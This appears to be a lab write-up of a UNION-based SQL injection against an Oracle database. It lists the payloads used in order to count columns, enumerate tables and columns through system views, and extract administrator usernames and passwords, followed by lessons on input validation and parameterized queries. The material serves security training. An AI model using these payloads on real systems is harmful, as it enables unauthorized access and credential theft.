# Lab Name
SQL injection attack, listing the database contents on Oracle.

## Vulnerability
SQL Injection (UNION-based)

## Objective
Exploit UNION-based SQL Injection to listing the database contents on Oracle.

## Entry Point
Category parameter

## Payload Used
  UNION SELECT NULL, NULL FROM dual--

  <img width="1496" height="752" alt="1 1" src="https://github.com/user-attachments/assets/4ebf5f7c-7493-4953-b381-ba811abcc2fc" />

  UNION SELECT table_name, NULL FROM all_tables--

  <img width="1496" height="755" alt="1 2" src="https://github.com/user-attachments/assets/77b8175b-45ca-44bc-a752-a5e14727d83c" />

  UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_EAAJOZ'--

  <img width="1491" height="752" alt="1 3" src="https://github.com/user-attachments/assets/7c448c7f-9fcb-4ec9-a139-549267f810bf" />

  UNION SELECT USERNAME_ZFVQVM, PASSWORD_ADMFHD FROM USERS_EAAJOZ--

  <img width="1495" height="757" alt="1 4" src="https://github.com/user-attachments/assets/bc865e1c-2aab-4079-add0-20dbb42ca1e4" />

  
## Result
- Successfully extracted administrator credentials after enumerating tables and columns using all_tables and all_tab_columns.

## Learning
- Reflected query output confirms the application is vulnerable to UNION-based SQL injection.
- Identifying the correct number of columns is mandatory before using UNION SELECT; otherwise the query fails.
- NULL values can be used as placeholders when the data type of other columns is unknown.
- Oracle system tables (all_tables and all_tab_columns) allow enumeration of database structure.
- After identifying the correct table and columns, UNION SELECT can be leveraged to extract sensitive data.
- Poor input validation and lack of parameterized queries allow attackers to access sensitive system information such as usernames and passwords.
